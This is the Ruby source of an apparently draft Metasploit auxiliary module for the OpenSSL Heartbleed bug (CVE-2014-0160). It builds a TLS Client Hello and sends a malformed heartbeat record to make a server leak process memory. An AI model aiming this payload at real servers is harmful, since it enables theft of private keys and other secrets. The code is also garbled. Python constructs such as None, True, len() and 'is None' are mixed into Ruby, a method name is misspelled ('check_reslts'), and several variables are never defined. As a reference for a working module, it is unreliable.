##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit4 < Msf::Auxiliary
    
    include Msf::Exploit::Remote::Tcp
    
    def initialize(info = {})
        super(update_info(info,
            'Name'		=> 'OpenSSL heartbleed bug',
            'Description'	=> %q{
                The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 
                1.0.1g do not properly handle Heartbeat Extension packets, which
                 allows remote attackers to obtain sensitive information from 
                process memory via crafted packets that trigger a buffer 
                over-read, as demonstrated by reading private keys, related to 
                d1_both.c and t1_lib.c, aka the Heartbleed bug. 
          },
          'Author'	=>
            [
              'Sebastiano Di Paola <sebastiano.dipaola[at]gmail.com>'
            ],
          'License'		=> MSF_LICENSE,
          'References'	=>
            [
              [ 'CVE', '2014-0160'],
              [ 'URL', 'https://www.openssl.org/news/secadv_20140407.txt']
            ],
          'DisclosureDate' => 'Apr 07 2014'))

                
        register_options(
        [ 
            Opt::RPORT(443),
        ], self.class)

#        register_advanced_options(
#        [
#            OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet command', 10]),
#            OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])
#        ], self.class)

    end

    def break_heart

        # Client Hello
        p1 =  "\x16"					# Content Type: Handshake
        p1 << "\x03\x01"				# Version: TLS 1.0
        p1 << "\x00\x7e"				# Length: 126
        p1 << "\x01"					# Handshake Type: Client Hello
        p1 << "\x00\x00\x7a"			# Length: 122
        p1 << "\x03\x02"				# Version: TLS 1.1
        p1 << ("X" * 32)				# Random (32 times 'X'...very random :))
        p1 << "\x00"					# Session ID Length: 0
        p1 << "\x00\x08"				# Cypher Suites Length: 6
        p1 << "\xc0\x13"				# - ECDHE-RSA-AES128-SHA
        p1 << "\x00\x39"				# - DHE-RSA-AES256-SHA
        p1 << "\x00\x35"				# - AES256-SHA
        p1 << "\x00\xff"				# - EMPTY_RENEGOTIATION_INFO_SCSV
        p1 << "\x01"					# Compression Methods Length: 1
        p1 << "\x00"					# - NULL-Compression
        p1 << "\x00\x49"				# Extensions Length: 73
        p1 << "\x00\x0b"				# - Extension: ec_point_formats
        p1 << "\x00\x04"				#   Length: 4
        p1 << "\x03"					#   EC Points Format Length: 3
        p1 << "\x00"					#   - uncompressed
        p1 << "\x01"					#   - ansiX962_compressed_prime
        p1 << "\x02"					#   - ansiX962_compressed_char2
        p1 << "\x00\x0a"				# - Extension: elliptic_curves
        p1 << "\x00\x34"				#   Length: 52
        p1 << "\x00\x32"				#   Elliptic Curves Length: 50
                        #   25 Elliptic curves:
        p1 << "\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a"
        p1 << "\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04"
        p1 << "\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10"
        p1 << "\x00\x11"

        bleed = "\x18\x03\x02\x00\x03\x01\x40\x00"

        connect
        sock.put(p1)

        while (true)
            type, ver, payload = read_server_messages(s)
            if type == None
                print_error("Server closed connection without sending Server Hello.")
                return
            end

            # Look for server hello done message.
            if type == 0x16 and int(payload[10]) == 0x0E
                break
            end
        end

        print_status("Sending heartbeat request...")
        sock.put(bleed)
        if check_results(sock)
            print_status("Server was heartbleed vulnerable")
        else
            print_status("Not vulnerable")
        end
    
        disconnect
    end

    def read_server_messages(s)
        # get header
        hdr = s.recv(5,5)
        if hdr == None
            print_error("We got a timeout from server..giving up...")
            return
        end
        type, ver, len = (resp).unpack("Cnn")

        if not type == 22 # Handshake
            return nil
        end

        payload = s.recv(len, 5)
        if payload == None
            print_error("Got an header but not payload...")
        end
        return type, ver, payload
    end


    def check_reslts(s)
        while True
            type, ver, payload = read_server_messages(s)
            if type is None
                print_status("No heartbeat response received, server likely not vulnerable")
                return False
            end
           if type == 24
                print_status("Received heartbeat response:")
                hexdump(pay)
                if len(pay) > 3
                    print_status("WARNING: server returned more data than it should - server is vulnerable!")
                    return True
                else
                    print_status("Server processed malformed heartbeat, but did not return any extra data.")
                    return False
                end
            end
            if type == 21
                print_status("Received alert:")
                print_status("Server returned error, likely not vulnerable")
                return False
            end
        end
    end
end
